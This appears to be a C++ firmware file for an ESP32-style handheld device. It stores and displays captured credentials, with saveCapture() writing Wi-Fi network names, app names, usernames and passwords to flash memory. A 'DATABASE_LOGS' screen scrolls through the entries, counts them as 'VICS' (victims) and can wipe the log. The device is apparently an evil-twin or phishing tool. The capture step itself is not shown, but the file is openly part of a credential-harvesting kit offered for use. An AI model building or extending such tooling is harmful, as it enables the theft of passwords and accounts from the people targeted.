#include "log_manager.h"
#include "FS.h"
#include "SPIFFS.h"
#include "display_config.h"

#define LOG_PATH "/db_logs.txt"
#define MATRIX_GREEN 0x07E0

const int ENC_CLK_L = 48;
const int ENC_DT_L  = 46;
const int ENC_SW_L  = 3;

void initLogSystem() {
    if (!SPIFFS.begin(true)) Serial.println("SPIFFS Fail");
}

void saveCapture(String ssid, String app, String user, String pass) {
    File file = SPIFFS.open(LOG_PATH, FILE_APPEND);
    if (file) {
        file.printf("[%s][%s] U:%s | P:%s\n", ssid.c_str(), app.c_str(), user.c_str(), pass.c_str());
        file.close();
    }
}

void drawWrappedText(LGFX &tft, String text, int x, int &y, int maxWidth) {
    String word = "";
    String line = "";
    for (int i = 0; i <= text.length(); i++) {
        if (i == text.length() || text[i] == ' ') {
            if (tft.textWidth(line + word) < maxWidth) {
                line += word + " ";
                word = "";
            } else {
                tft.setCursor(x, y);
                tft.print(line);
                y += 12;
                line = word + " ";
                word = "";
            }
        } else {
            word += text[i];
        }
    }
    tft.setCursor(x, y);
    tft.print(line);
    y += 18; 
}

void showLogsScreen(LGFX &tft, int btnBack, int btnEnter) {
    int scrollOffset = 0;
    bool redraw = true;
    bool running = true;
    int totalLines = 0;
    int lastClkL = digitalRead(ENC_CLK_L);

    while (running) {
        if (redraw) {
            tft.fillScreen(TFT_BLACK);
            tft.drawRect(0, 0, tft.width(), tft.height(), MATRIX_GREEN);
            tft.fillRect(0, 0, tft.width(), 35, MATRIX_GREEN);
            tft.setTextColor(TFT_BLACK); tft.setTextSize(2);
            tft.setCursor(15, 8); tft.print("DATABASE_LOGS");

            File file = SPIFFS.open(LOG_PATH, FILE_READ);
            tft.setTextSize(1); tft.setTextColor(MATRIX_GREEN);
            
            totalLines = 0;
            if (!file || file.size() == 0) {
                tft.setCursor(20, 100); tft.print("HISTORIAL_VACIO_");
            } else {
                int y = 45;
                while (file.available()) {
                    String line = file.readStringUntil('\n');
                    if (totalLines >= scrollOffset && y < 210) {
                        drawWrappedText(tft, "> " + line, 10, y, 300);
                    }
                    totalLines++;
                }
                tft.drawFastHLine(10, 215, 300, MATRIX_GREEN);
                tft.setTextColor(TFT_WHITE);
                tft.setCursor(10, 222); 
                tft.printf("VICS:%d | POS:%d/%d", totalLines, (totalLines > 0 ? scrollOffset + 1 : 0), totalLines);
            }
            if(file) file.close();
            tft.setCursor(185, 222); tft.print("[OK] DEL [LONG] BACK");
            redraw = false;
        }

        // --- ENCODER SCROLL ---
        int currentClk = digitalRead(ENC_CLK_L);
        if (currentClk != lastClkL && currentClk == LOW) {
            if (digitalRead(ENC_DT_L) != currentClk) {
                if(scrollOffset < totalLines - 1) { scrollOffset++; redraw = true; }
            } else {
                if(scrollOffset > 0) { scrollOffset--; redraw = true; }
            }
        }
        lastClkL = currentClk;

        // --- BOTONES FISICOS ---
        if (digitalRead(1) == LOW) { if(scrollOffset > 0) { scrollOffset--; redraw = true; } delay(120); }
        if (digitalRead(2) == LOW) { if(scrollOffset < totalLines - 1) { scrollOffset++; redraw = true; } delay(120); }

        // --- CLICK LOGIC ---
        if (digitalRead(ENC_SW_L) == LOW || digitalRead(btnEnter) == LOW) {
            unsigned long startP = millis();
            bool isLong = false;
            while(digitalRead(ENC_SW_L) == LOW || digitalRead(btnEnter) == LOW) {
                if (millis() - startP > 600) { isLong = true; break; }
                yield();
            }

            if (isLong) {
                running = false; // Salir al menú
            } else {
                // MODAL DE CONFIRMACIÓN
                tft.fillRect(40, 80, 240, 80, TFT_BLACK);
                tft.drawRect(40, 80, 240, 80, 0xF800);
                tft.setTextColor(0xF800);
                tft.setCursor(65, 100); tft.print("¿BORRAR TODO?");
                tft.setCursor(65, 130); tft.print("[CLICK] SI  [LONG] NO");
                
                delay(300); // Anti-rebote
                bool waitingConfirm = true;
                while(waitingConfirm) {
                    if(digitalRead(ENC_SW_L) == LOW || digitalRead(btnEnter) == LOW) {
                        unsigned long subP = millis();
                        bool subLong = false;
                        while(digitalRead(ENC_SW_L) == LOW || digitalRead(btnEnter) == LOW) {
                            if (millis() - subP > 600) { subLong = true; break; }
                            yield();
                        }
                        
                        if (subLong) { 
                            // CLICK LARGO = CANCELAR
                            redraw = true; waitingConfirm = false; 
                        } else { 
                            // CLICK CORTO = BORRAR
                            SPIFFS.remove(LOG_PATH); scrollOffset = 0; redraw = true; waitingConfirm = false; 
                        }
                    }
                    if(digitalRead(btnBack) == LOW) { redraw = true; waitingConfirm = false; }
                    yield();
                }
            }
            delay(200);
        }

        if (digitalRead(btnBack) == LOW) { running = false; delay(200); }
        yield();
    }
}